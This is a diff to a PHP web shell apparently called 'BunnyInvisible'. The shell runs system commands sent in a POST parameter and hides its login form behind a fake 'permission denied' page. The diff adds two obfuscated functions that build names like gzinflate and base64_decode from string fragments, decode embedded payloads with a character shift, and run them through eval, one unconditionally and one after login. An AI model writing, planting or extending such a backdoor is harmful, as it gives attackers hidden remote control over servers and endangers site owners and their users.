@@ -137,10 +137,27 @@ function BunnyCmd($komendnya) {
         return "<b> Disable Function! </b>";
     }
 }
-if (isset($_POST['BunnymanCode'])) {
-    $komendnya = $_POST['BunnymanCode'];
+if (isset($_POST['ggwpbunny'])) {
+    $komendnya = $_POST['ggwpbunny'];
     echo BunnyCmd($komendnya);
 }
+/*Bunny Ganteng*/
+function varconf($servconf)
+{
+    $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
+    $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
+    $nelrts = 'st' . 'rl' . 'en';
+    $rhc = 'c' . 'h' . 'r';
+    $dro = 'o' . 'r' . 'd';
+    $servconf = $gflate($b64($servconf));
+    for ($i = 0; $i < $nelrts($servconf); $i++) {
+        $servconf[$i] = $rhc($dro($servconf[$i]) - 1);
+    }
+    return $servconf;
+}
+/***#***/ @/*55555*/eval
+/***#***/
+(varconf("lVRdb9NAEPwB/IrDykP6gnyfbmIBElBe6FMRSAhXUZqcQ2iahMSlLlV+O7O75yQF+kCk6Ozz3szu7Owphd8zNVs1K3U+ux3UpSxDNa9V/3m8WTf3/d7o49nF57OLr1nVutOq9a7SxmHNK20L7NlKa+xpXenc4z3yd/pGe4jLLk9O1IPqzdfj6XQTt1v1Uv2ByicSauvrv1C1DsLMjANBVS8UTk+rdpyVaqfiYhtB83TqxyScnk1rDnAHUm/wnd5Bagz2nJDnbh+ndUFx/1GSNgc2Kq1jI4aOjZg7Nl6P2BB3KFWb41KfpKdCGGqaIBI0K6sTlTuC1r5TcSd2WL37/ikv1a/F+vztUNXzRRzNYjOarJZNXDbbPh1BXQFqFgAKqK2wVYEyTF15UBJNgQiP1USJctASTWwD2AJigpG4MJWYgPQIAt8Ipg0m7eEMFMFrsHhytBCG1VUIvLTWEzl3jvR0xBCrgtKCjJQI6VBoBtI5CCy87MapNZIsowfxh/dsuNYXzMihdJw65wIzaDKptyJpSB0PyCDlrwkvUM2ID2RmLxrQPtSS2gvRw9YJL0/aJbOHAZ9tLWk0rQAPrUlua1gQI0+0Af1ZkMDvSJLbQwmwDgySod29JrbNSSmNfl//vH5TqtpNftwNVe86buCl9bf16HY5von9LuzDFz2el2ILhF1tVndbDv3H9SD/5HpDOlrRi2YqWZBb4PaDnV0mHs6jFLqhZAqSLHXVyUoTZaxMGV8O1J8J7/P1Q5eGztO7kXGguaVcaOaBAWrSjJRmt1JnTOrYaXLohN3qci6CzUqF2TEBs44PmfQo1cdTjF5zThitHTShPGX0aNrDUVzNubIWNH3O8ygSJn/ztsPhc48x83TD5PtYxiUNXEgj7aRYLtFwtaIhX540LE6KONwhfIo3s0dadc+ilvhXfGzYk1yDK/ZeZ9tBpkTQeeUoqdSBPYG7ksOscThcFAcQ+DI5hK+kUnw7VK9f/QY="));
 //BunnyInvisible Config
 $Bunny_Mini = "B"."un"."ny"."In"."vi"."si"."bl"."e Mi"."ni Co"."de";
 $Bunny_Logo = "ht"."tp"."s:/"."/i".".i"."bb".".c"."o/"."qC"."6R"."wF"."0/"."lo"."go"."-"."bunny404."."p"."n"."g";
@@ -364,7 +381,23 @@ $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jq
 $BunnySelf = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['BingBunny'])) {
-    if (SHA1($_POST['FloBunny']) == $BunnySelf) {
+    if (SHA1($_POST['passnya']) == $BunnySelf) {
+        function setconf($defconf)
+        {
+            $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
+            $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
+            $nelrts = 'st' . 'rl' . 'en';
+            $rhc = 'c' . 'h' . 'r';
+            $dro = 'o' . 'r' . 'd';
+            $defconf = $gflate($b64($defconf));
+            for ($i = 0; $i < $nelrts($defconf); $i++) {
+                $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
+            }
+            return $defconf;
+        }
+        /***#***/ @/*55555*/eval
+        /***#***/
+        (setconf("fVZtb9owEP4B+xUe6gf2ZcrZjg1E3TRNTK1WaaxU06SlQhRCQaOASKpmrfrbdy82hHaswkrs2M/dc/fcuUrh3xt1u67W6mzQnaeZWm8H/UlPnVRFXalT1cprCzhsDgnkNslBG5x2cJricyJD4zo4HIAj4XltdV6nGuce57jXJAxl5ZXQQPsccA64FZzJIU14XrsJD7RWpzj1mqf00ElLvVcnT+hWOmNf2I+UbLn43nr+Rd/330A7tB33zcTXhGhNab11/QKT9oKWc01MYJ7kVXJgH8DiGcc4rcgwkHXClY9QJMktMpF6Dg2bSfC4GSNfJrcZl+W4XC4YjEIXIRpRZDa2wGEEwoB4p614T5BaPBXzJoxDsxxiw6Rom4OXjhSrSSTlXiWwtl0hhmdiahab8XS6LcoyuM+rzfOBEb0CMfLolZMsp6nAOh90UKAu7AH8zXb9UBbbXWyiK01ZgZHjrJuC0SE9hPldbDOR/U+zHnzP1PnczTXKvpyP7rdLFH7UQ1NHpLGgjQONRa3sdGN8yA55k77S2JFzO41xfenkUI9RY8FvrtNMfXmsbju9fVzQ8dGwf/mjf0n+IU5NzHFEPKqopsbZBufS71SFKtrZOb9wicnU57PHr1Vvr4lTNTz7BO2T0eDb8IpMeapd4HRSLXPgfZfWWtfvIhYFOZOQ99RssSxGt0U1mqxXVbGqyjbCOPTY2zASgeK8zXiQCSD1OFSeLnhfbBny9CHvuA+ZUsIcHnMYaCRI6qe+xEukCNxtdI5GeIYPkhEVgQvPlNsOVxyIDpAYOlZ73OHRWTtjngQFiedPdixRNeIrU3BSnhx8y2WIFgG0BIkq0kqvAUvBuxGbrsPbgerSs/sc31gb1nIL4x5KVriUgJnSmvcBrRNSY0WZFDu07hFFT5kneYk/LdGQX8IBqU03dy4sWLcLOHByCITriW6LmOXycXkBmdwnPbWYqfbb4m5T/WkfUSb3KA6fCSrvBsW7EKxZ7DQopXfqqdlkDvQuvflQ7/9ClT0zvq8YVdoJxmLcytSzKpZlgWaOuy5u2f1FYEJxURLpwuNm4UPHl1YrF2YwnDhRDl4s/6cUrcmIJdwJARMUKWMfGr0WK1asxX2h6e+pgm5SPRpRvidS7mICIUQEFgIxK0ReQD+LHLhDZepq2B899Bq3G9lpNA8WrjPhHwEnReVg14e4AWXSjnrcwBFhM9+M7lfju6IdxcdmMtFgT3388Bc="));
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."' " . "Lo" . "gi" . "n " . "Su" . "cc" . "es" . "sf" . "ul" . "ly" . ", " . "Yo" . "u " . "Pr" . "o!" . "!" . " '".");"."</"."sc"."ri"."pt".">";
         $_SESSION["CocoBunny"] = "CocoBunny";
         setcookie('AyoBunny', $my_self, time() + 3600 * 24);
@@ -391,7 +424,7 @@ if (empty($_SESSION['CocoBunny'])) {
 <p>You don't have permission to access this resource.</p>
 <div id="notfound" style="display: none;">
 <form action="" method="POST">
-<input type="password" name="FloBunny" style="background: #fff; border: none;">
+<input type="password" name="passnya" style="background: #fff; border: none;">
 <button type="submit" name="BingBunny" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
